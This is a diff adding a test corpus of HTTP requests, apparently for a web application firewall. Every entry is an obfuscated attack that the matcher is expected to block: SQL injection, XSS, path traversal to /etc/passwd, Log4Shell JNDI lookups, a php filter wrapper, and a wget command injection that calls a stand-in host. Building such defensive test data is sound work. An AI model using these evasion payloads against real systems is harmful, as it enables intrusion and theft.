@@ -1,0 +1,32 @@
+# Evasion corpus (PK-153): the same attacks written to get past a matcher. Every line must block.
+{"method":"GET","path":"/","query":"q=%2527%2520or%25201%253D1--","expect":"block","note":"double percent"}
+{"method":"GET","path":"/","query":"q=1%252527+UNION+SELECT+2","expect":"block","note":"triple percent"}
+{"method":"GET","path":"/","query":"q=UnIoN%20SeLeCt%201","expect":"block","note":"mixed case"}
+{"method":"GET","path":"/","query":"q=1/**/union/**/select/**/2","expect":"block","note":"sql comment as space"}
+{"method":"GET","path":"/","query":"q=1/*!50000union*/select+2","expect":"block","note":"mysql version comment"}
+{"method":"GET","path":"/","query":"q=%00<script>alert(1)</script>","expect":"block","note":"nul byte"}
+{"method":"GET","path":"/","query":"q=<scr%00ipt>alert(1)</scr%00ipt>","expect":"block","note":"nul inside a word"}
+{"method":"GET","path":"/","query":"q=union%0aselect%0a1","expect":"block","note":"newline as space"}
+{"method":"GET","path":"/","query":"q=union%09select%091","expect":"block","note":"tab as space"}
+{"method":"GET","path":"/","query":"q=1+UNION+ALL+SELECT+2%0a","expect":"block","note":"trailing newline"}
+{"method":"GET","path":"/","query":"q=%EF%BC%9Cscript%EF%BC%9Ealert(1)%EF%BC%9C/script%EF%BC%9E","expect":"block","note":"full-width angle brackets"}
+{"method":"GET","path":"/","query":"q=%u003cscript%u003ealert(1)%u003c/script%u003e","expect":"block","note":"iis unicode escape"}
+{"method":"POST","path":"/","headers":{"Content-Type":"application/json"},"body":"{\"a\":\"&lt;script&gt;alert(1)&lt;/script&gt;\"}","expect":"block","note":"html entities"}
+{"method":"POST","path":"/","headers":{"Content-Type":"application/json"},"body":"{\"a\":\"&#60;script&#62;alert(1)&#60;/script&#62;\"}","expect":"block","note":"numeric entities"}
+{"method":"GET","path":"/..%2f..%2f..%2fetc/passwd","expect":"block","note":"encoded slash"}
+{"method":"GET","path":"/%2e%2e/%2e%2e/etc/passwd","expect":"block","note":"encoded dots"}
+{"method":"GET","path":"/..%252f..%252fetc/passwd","expect":"block","note":"double encoded slash"}
+{"method":"GET","path":"/..\\..\\etc\\passwd","expect":"block","note":"backslash"}
+{"method":"GET","path":"/","headers":{"X-A":"${JnDi:LDAP://e.test/a}"},"expect":"block","note":"log4shell upper case"}
+{"method":"GET","path":"/","headers":{"X-A":"${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap://e.test/a}"},"expect":"block","note":"log4shell env lookups"}
+{"method":"GET","path":"/","query":"url=java%09script:alert(1)","expect":"block","note":"tab inside the scheme"}
+{"method":"GET","path":"/","query":"url=JaVaScRiPt:alert(1)","expect":"block","note":"scheme case"}
+{"method":"GET","path":"/","query":"q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E","expect":"block","note":"encoded tag"}
+{"method":"GET","path":"/","query":"q=<img/src=x/onerror=alert(1)>","expect":"block","note":"slashes instead of spaces"}
+{"method":"GET","path":"/","query":"q=1'+OR+'1'='1","expect":"block","note":"quoted tautology upper case"}
+{"method":"GET","path":"/","query":"q=1+oR+1=1","expect":"block","note":"or mixed case"}
+{"method":"GET","path":"/","query":"q=%27%20%6fr%201%3d1%20--%20","expect":"block","note":"encoded letters"}
+{"method":"GET","path":"/","query":"q=1;SELECT+SLEEP(5)--","expect":"block","note":"stacked sleep"}
+{"method":"GET","path":"/","query":"a=<scr&b=ipt>alert(1)</script>","expect":"block","note":"split across parameters, the tail still scores"}
+{"method":"GET","path":"/","query":"q=;WGET%20http://e.test/x","expect":"block","note":"command upper case"}
+{"method":"GET","path":"/","query":"q=php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dindex","expect":"block","note":"encoded wrapper"}
